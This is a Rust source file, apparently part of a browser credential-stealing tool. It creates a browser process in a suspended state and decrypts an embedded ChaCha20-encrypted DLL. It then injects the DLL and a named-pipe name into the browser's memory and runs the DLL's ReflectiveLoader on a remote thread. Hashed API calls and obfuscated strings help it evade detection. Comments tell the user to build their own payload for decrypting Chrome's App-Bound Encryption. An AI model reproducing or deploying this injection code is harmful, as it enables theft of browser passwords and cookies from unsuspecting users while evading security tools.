use crate::sprotect;
use crate::api_resolve::HashedAPIs;
use std::ptr::null_mut;
use std::ffi::OsString;
use std::os::windows::ffi::OsStrExt;
use chacha20::{ChaCha20, Key, Nonce, cipher::{KeyIvInit, StreamCipher}};
use winapi::um::{
    processthreadsapi::{PROCESS_INFORMATION, STARTUPINFOW},
    winbase::CREATE_SUSPENDED,
    winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE},
};

// REPLACE: Build your own reflective DLL payload
// We do not provide the encrypted.bin - you must create your own
// Recommended: Custom build of https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption
// Your DLL must:
//   1. Export a "ReflectiveLoader" function
//   2. Implement IPC communication matching the Rust logic in this codebase
//   3. Be encrypted with ChaCha20 using the key/nonce below
const EFILE: &[u8] = include_bytes!("../../../encrypted.bin");

// REPLACE: Generate your own 32-byte ChaCha20 key and 12-byte nonce
// Use a cryptographically secure random generator
const CHACHA20_KEY: [u8; 32] = [
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
];

const CHACHA20_NONCE: [u8; 12] = [
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00
];

pub async fn inject_browser(browser_path: &str, pipe_name: &str) -> Result<(), ()> {
    let wide_path: Vec<u16> = OsString::from(browser_path).encode_wide().chain(std::iter::once(0)).collect();

    unsafe {
        let mut si: STARTUPINFOW = std::mem::zeroed();
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;

        if HashedAPIs::create_process_w(
            wide_path.as_ptr(),
            null_mut(),
            null_mut(),
            null_mut(),
            0,
            CREATE_SUSPENDED,
            null_mut(),
            null_mut(),
            &mut si as *mut _ as *mut std::ffi::c_void,
            &mut pi as *mut _ as *mut std::ffi::c_void,
        ) == 0 {
            return Err(());
        }

        let decrypted_payload = decrypt_payload();
        let payload_size = decrypted_payload.len();
        let pipe_name_wide: Vec<u16> = OsString::from(pipe_name).encode_wide().chain(std::iter::once(0)).collect();
        let pipe_size = pipe_name_wide.len() * 2;
        let total_size = payload_size + pipe_size;

        let remote_mem = HashedAPIs::virtual_alloc_ex(
            pi.hProcess as *mut _,
            null_mut(),
            total_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if remote_mem.is_null() {
            HashedAPIs::close_handle(pi.hProcess as *mut _);
            HashedAPIs::close_handle(pi.hThread as *mut _);
            return Err(());
        }

        let mut bytes_written = 0;
        if HashedAPIs::write_process_memory(
            pi.hProcess as *mut _,
            remote_mem,
            decrypted_payload.as_ptr() as *const _,
            payload_size,
            &mut bytes_written,
        ) == 0 {
            HashedAPIs::close_handle(pi.hProcess as *mut _);
            HashedAPIs::close_handle(pi.hThread as *mut _);
            return Err(());
        }

        let pipe_addr = (remote_mem as usize + payload_size) as *mut _;
        if HashedAPIs::write_process_memory(
            pi.hProcess as *mut _,
            pipe_addr,
            pipe_name_wide.as_ptr() as *const _,
            pipe_size,
            &mut bytes_written,
        ) == 0 {
            HashedAPIs::close_handle(pi.hProcess as *mut _);
            HashedAPIs::close_handle(pi.hThread as *mut _);
            return Err(());
        }

        let mut old_protect = 0;
        HashedAPIs::virtual_protect_ex(
            pi.hProcess as *mut _,
            remote_mem,
            total_size,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        );

        let entry_point = (remote_mem as usize + find_reflective_loader_offset(&decrypted_payload)) as *mut std::ffi::c_void;

        let thread = HashedAPIs::create_remote_thread(
            pi.hProcess as *mut _,
            null_mut(),
            0,
            entry_point,
            pipe_addr,
            0,
            null_mut(),
        );

        if !thread.is_null() {
            HashedAPIs::close_handle(thread);
        }

        HashedAPIs::close_handle(pi.hProcess as *mut _);
        HashedAPIs::close_handle(pi.hThread as *mut _);
    }

    Ok(())
}

fn decrypt_payload() -> Vec<u8> {
    let mut decrypted = EFILE.to_vec();
    let key = Key::from_slice(&CHACHA20_KEY);
    let nonce = Nonce::from_slice(&CHACHA20_NONCE);
    let mut cipher = ChaCha20::new(key, nonce);
    cipher.apply_keystream(&mut decrypted);
    decrypted
}

fn find_reflective_loader_offset(payload: &[u8]) -> usize {
    unsafe {
        let dos_header = &*(payload.as_ptr() as *const winapi::um::winnt::IMAGE_DOS_HEADER);
        if dos_header.e_magic != winapi::um::winnt::IMAGE_DOS_SIGNATURE {
            return 0;
        }

        let nt_headers = &*((payload.as_ptr() as usize + dos_header.e_lfanew as usize) as *const winapi::um::winnt::IMAGE_NT_HEADERS64);
        if nt_headers.Signature != winapi::um::winnt::IMAGE_NT_SIGNATURE {
            return 0;
        }

        let export_rva = nt_headers.OptionalHeader.DataDirectory[winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_EXPORT as usize].VirtualAddress;
        if export_rva == 0 {
            return 0;
        }

        let rva_to_offset = |rva: u32| -> Option<usize> {
            let sections = std::slice::from_raw_parts(
                ((nt_headers as *const _ as usize) + std::mem::size_of::<winapi::um::winnt::IMAGE_NT_HEADERS64>()) as *const winapi::um::winnt::IMAGE_SECTION_HEADER,
                nt_headers.FileHeader.NumberOfSections as usize
            );

            for section in sections {
                if rva >= section.VirtualAddress && rva < section.VirtualAddress + section.SizeOfRawData {
                    return Some((section.PointerToRawData + (rva - section.VirtualAddress)) as usize);
                }
            }
            None
        };

        let export_offset = match rva_to_offset(export_rva) {
            Some(offset) => offset,
            None => return 0,
        };

        let export_dir = &*((payload.as_ptr() as usize + export_offset) as *const winapi::um::winnt::IMAGE_EXPORT_DIRECTORY);

        let names_offset = match rva_to_offset(export_dir.AddressOfNames) {
            Some(offset) => offset,
            None => return 0,
        };

        let ordinals_offset = match rva_to_offset(export_dir.AddressOfNameOrdinals) {
            Some(offset) => offset,
            None => return 0,
        };

        let functions_offset = match rva_to_offset(export_dir.AddressOfFunctions) {
            Some(offset) => offset,
            None => return 0,
        };

        let names = std::slice::from_raw_parts(
            (payload.as_ptr() as usize + names_offset) as *const u32,
            export_dir.NumberOfNames as usize
        );

        let ordinals = std::slice::from_raw_parts(
            (payload.as_ptr() as usize + ordinals_offset) as *const u16,
            export_dir.NumberOfNames as usize
        );

        let functions = std::slice::from_raw_parts(
            (payload.as_ptr() as usize + functions_offset) as *const u32,
            export_dir.NumberOfFunctions as usize
        );

        for i in 0..export_dir.NumberOfNames {
            let name_rva = names[i as usize];
            if let Some(name_offset) = rva_to_offset(name_rva) {
                let name_ptr = (payload.as_ptr() as usize + name_offset) as *const i8;
                let name = std::ffi::CStr::from_ptr(name_ptr).to_string_lossy();
                
                if name == sprotect!("ReflectiveLoader") {
                    let ordinal = ordinals[i as usize];
                    if (ordinal as usize) < functions.len() {
                        let func_rva = functions[ordinal as usize];
                        if let Some(func_offset) = rva_to_offset(func_rva) {
                            return func_offset;
                        }
                    }
                }
            }
        }

        0
    }
}